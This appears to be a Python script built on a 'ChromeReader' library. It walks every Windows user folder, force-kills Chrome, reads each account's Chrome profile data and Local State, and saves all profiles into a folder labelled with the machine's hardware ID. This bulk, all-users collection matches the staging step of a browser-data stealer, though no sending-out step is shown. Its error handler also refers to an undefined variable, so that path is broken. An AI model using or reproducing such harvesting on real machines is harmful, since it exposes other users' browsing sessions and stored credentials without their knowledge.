import ChromeReader
import os
import uuid
from warnings import warn

class Profile(ChromeReader.Profile):
    def save(self, path: str, make_folder: bool = True, make_visualizer_file: bool = True):
        path = super().save(path, make_folder)

        if make_visualizer_file:
            with open(os.path.join(path, "Visualize.crv"), "w") as file:
                file.close()

class User(ChromeReader.User):
    @classmethod
    def get(cls, user_path: str = os.path.expanduser("~")):
        user_data_path = os.path.join(user_path, "AppData", "Local", "Google", "Chrome", "User Data")
        user_name = os.path.split(user_path)[1]

        if os.path.exists(user_data_path):
            try:
                local_state = ChromeReader.LocalState.create_local_state_session(os.path.join(user_data_path, "Local State"))
                profiles = [Profile(os.path.join(user_data_path, profile_name), local_state.get_profile_dict(profile_name), profile_name) for profile_name in local_state.get_profiles_names()]
                return cls(profiles, user_name)
            except:
                warn(f"User of {user_name} failed:\n{e}")
        else:
            warn(f"User Data path of {user_name} doesn't exist.")
    
    def save(self, path: str, make_folder: bool = True, make_visualizer_files: bool = True):
        if make_folder:
            path = os.path.join(path, self.user_name)

        for profile in self.profiles:
            profile.save(path, make_folder=True, make_visualizer_file=make_visualizer_files)

class UserManager(ChromeReader.UserManager):
    @classmethod
    def get(cls, users_path: str = r"C://Users"):
        users_names = [u for u in os.listdir(users_path) if os.path.isdir(os.path.join(users_path, u)) and u not in ("Default", "Default User", "All Users", "Public")]
        users = [User.get(os.path.join(users_path, user_name)) for user_name in users_names]
        users = [u for u in users if u is not None]
        return cls(users)

    def save(self, path: str, make_visualizer_files: bool = True):
        for user in self.users:
            user.save(path, make_folder=True, make_visualizer_files=make_visualizer_files)

def run():
    try:
        os.system("taskkill /f /im chrome.exe")
    except:
        pass

    user_manager = UserManager.get()
    user_manager.save(os.path.join("profiles", f"PC {uuid.getnode()}"))

if __name__ == "__main__":
    run()